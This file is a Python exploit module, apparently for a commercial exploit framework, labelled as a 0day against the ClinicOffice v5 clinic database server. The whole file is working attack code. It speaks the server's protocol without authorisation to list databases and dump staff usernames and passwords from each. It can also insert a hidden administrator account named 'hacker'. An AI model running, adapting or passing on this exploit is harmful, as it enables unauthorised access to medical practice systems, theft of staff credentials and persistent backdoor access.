#!/usr/bin/env python
import struct
import socket
from collections import OrderedDict
from cStringIO import StringIO
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_clinicoffice5_db_management"
INFO['DESCRIPTION'] = "ClinicOffice v5 Database Management"
INFO['VENDOR'] = "https://pioneersoftware.co.uk/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    edbsrvr.exe allows to remote unauthorized attacker to execute SQL queries. 
Tested againstClinicOffice v5 build 1092 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://pioneersoftware.co.uk/co-trial"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "3 May, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 12010
OPTIONS["CREATE_NEW_ADMIN"] = False, dict(description="Create new hidden supervizor account")
OPTIONS["DB"] = ""
OPTIONS["NEW_ADMIN_NAME"] = ""


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.create_admin = self.args.get("CREATE_NEW_ADMIN", OPTIONS["CREATE_NEW_ADMIN"])
        self.dbname = str(self.args.get("DB", OPTIONS["DB"]))
        self.admin_name = str(self.args.get("NEW_ADMIN_NAME", OPTIONS["NEW_ADMIN_NAME"]))

    def make_table(self, header=None, data=None):
        tmp = header + data
        max_fields_width = []
        for i in range(len(header)):
            max_fields_width.append(len(max(tmp, key=lambda x: len(x[i]))[i]) + 3)
        horizontal = '+' + '+'.join('-' * width for width in max_fields_width) + '+\r\n'
        output = '\r\n' + horizontal
        output += '|' + '|'.join(header[i].center(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        sorted_data = sorted(data)
        for entry in sorted_data:
            output += '|' + '|'.join(entry[i].ljust(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        return output

    def connect(self):
        data = '8a56924d4e6e8b42c220c2b3adfd1274d8000000d600000000000000020000008057000000000000030000000800000045004400420044004100430043005300000e000000500045004e005400450053005400500043003a0035003400350032000d00000045004400420043006f006e006e0065006300740069006f006e001d0000002e004e0045005400200044006100740061002000500072006f0076006900640065007200200043006f006e006e0065006300740069006f006e000100000000000f000000640000000000e803000003000000000000'.decode(
            'hex')
        self.sock.send(data)
        data = self.sock.recv(4096).replace('\00', '')
        # print repr(data)

        data = '8a56924d4e6e8b42c220c2b3adfd12744000000040000000000000000300000002e2642a38083f41e85dbf2e7ae64c4e43209fed78cf9fe8f1e546d2f759bafc'.decode(
            'hex')
        self.sock.send(data)
        data = self.sock.recv(4096)
        # print repr(data)

    def get_db_name(self, data):
        length = struct.unpack('B', data[87:88])[0] * 2
        # print repr(data[86:100])
        name = data[88: 88 + length]
        return name

    def make_common_request(self, query, op1, op2, op3):
        query = ''.join(ch + '\x00' for ch in query)
        res = self.make_header(query, op1, op2, op3)
        return res

    def make_header(self, data, op1, op2, op3):
        header = '\x8a\x56\x92\x4d\x4e\x6e\x8b\x42\xc2\x20\xc2\xb3\xad\xfd\x12\x74'
        length = len(header) + 24 + len(data)
        res = header + struct.pack('I', length) + struct.pack('I', length)
        res += '\x00' * 4 + op1 + '\x00\x00\x00' + op2 + '\x00\x00\x00' + op3 + '\x00\x00\x00'
        res += data
        return res

    def make_db_query(self, query, op1='\xfa', op2='\x01', op3='\x25', insert=False):
        # print 'Execute query: %s' % query
        data = self.make_common_request(query, op1, op2, op3)
        self.sock.send(data)
        data = self.sock.recv(4096)
        res = []
        # fields
        data = self.make_header('', '\xfb', '\x01', '\x00')
        self.sock.send(data)
        data = self.sock.recv(16000)
        if not insert:
            fields_count = struct.unpack('I', data[66:70])[0] - 1
            # print "Fields count: %s" % fields_count
            data = StringIO(data[154:])
            fields = []
            for i in range(fields_count):
                row_id = struct.unpack('I', data.read(4))[0]
                field_name_length = struct.unpack('I', data.read(4))[0] * 2
                field = data.read(field_name_length).replace('\x00', '')
                data.read(6)
                opcode1 = data.read(1)
                data.read(7)
                opcode2 = data.read(2)
                data.read(2)
                field_max_length = struct.unpack('I', data.read(4))[0]
                data.read(34)
                db_field_name_length = struct.unpack('I', data.read(4))[0] * 2
                db_field_name = data.read(db_field_name_length).replace('\x00', '')
                data.read(2)
                entry = dict(row_id=row_id, field_name=field, field_length=field_max_length,
                             field_dbname=db_field_name, op1=opcode1, op2=opcode2)
                fields.append(entry)

            # values
            data = self.make_header('', '\xd2', '\x02', '\x01')
            self.sock.send(data)
            data = self.sock.recv(4096)
            # print repr(data.replace('\x00', ''))
            res = [self.parse_entry(data, fields)]
            entries_count = struct.unpack('I', data[46:50])[0]

            id_num = 1
            while entries_count - 1 > 0:
                # next value
                data = '\x00' + (chr(id_num) + '\x00\x00\x00') * 2 + '\x00\x00\x01\x00\x00\x00\x00'
                data = self.make_header(data, '\xd4', '\x02', '\x01') + ''
                self.sock.send(data)
                data = self.sock.recv(16000)
                data = self.parse_entry(data, fields)
                res.append(data)
                id_num += 1
                entries_count -= 1
            # ending
        self.sock.send('8a56924d4e6e8b42c220c2b3adfd1274280000002400000000000000b80000000200000001000000'.decode('hex'))
        self.sock.recv(1024)
        self.sock.send('8a56924d4e6e8b42c220c2b3adfd1274280000002400000000000000fc0000000100000001000000'.decode('hex'))
        self.sock.recv(1024)
        return res

    def parse_entry(self, data, fields):
        data = StringIO(data[86:])
        new = {}
        for entry in fields:
            data.read(1)
            if entry['op1'] == '\x01':
                data.read(2)
                value = data.read(entry['field_length'] - 2).replace('\x00', '')
            elif entry['op1'] == '\x07':
                value = data.read(entry['field_length'])
                # print repr(value)
                value = struct.unpack('Q', value)[0]
            else:
                value = data.read(entry['field_length'])
            new[entry['field_name']] = value
        # pprint.pprint(new)
        return new

    def use_db(self, db_name):
        header = '\x8a\x56\x92\x4d\x4e\x6e\x8b\x42\xc2\x20\xc2\xb3\xad\xfd\x12\x74'
        length = len(header) + 26 + len(db_name) * 2
        res = header + struct.pack('I', length) + struct.pack('I', length)
        res += '\x00' * 4 + '\x21\x00\x00\x00' + struct.pack('I', len(db_name))
        res += ''.join(ch + '\x00' for ch in db_name) + '\x01\x00\x00\x50\x00\x45'
        # print repr(res)
        self.sock.send(res)
        data = self.sock.recv(1024)
        # print repr(data)

    def make_sql_query(self, query, insert=False):
        # data = make_common_request(query, '\xfa', '\x02', '\xb4')
        return self.make_db_query(query, '\xfa', '\x02', '\xb4', insert)

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Connecting to %s:%s" % (self.host, self.port))
        self.sock = socket.socket()
        self.sock.connect((self.host, self.port))
        self.log('[*] Connecting to DB')
        self.connect()
        self.log('[*] Databases list:')
        res = self.make_db_query('select name from databases')
        table_data = [[value[key] for key in value.keys()] for value in res]
        table = self.make_table(res[0].keys(), table_data)
        self.log('[+]' + table)
        self.log('[*] Recieving credentials from databases')
        self.sock.close()
        for db in res:
            self.sock = socket.socket()
            self.sock.connect((self.host, self.port))
            self.connect()
            dbname = db['name']
            self.log(dbname)
            self.use_db(dbname)
            res = self.make_sql_query("select username, password, knownas from staff;")
            table_data = [[value[key] for key in value.keys()] for value in res]
            table = self.make_table(res[0].keys(), table_data)
            self.log(table)
            self.sock.close()
        if self.create_admin:
            self.log('[*] Creating admin account with username "%s"' % self.admin_name)
            self.sock = socket.socket()
            self.sock.connect((self.host, self.port))
            self.connect()
            self.use_db(self.dbname)
            res = self.make_sql_query(
                "insert into staff(id, username, password, knownas, per_id, accgrp_id) values (9999, '%s', '', 'hacker', 1, 1) ;" % self.admin_name, True)
            self.log('[+] User "%s" has been created at DB "%s"' % (self.admin_name, self.dbname))
            self.sock.close()
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()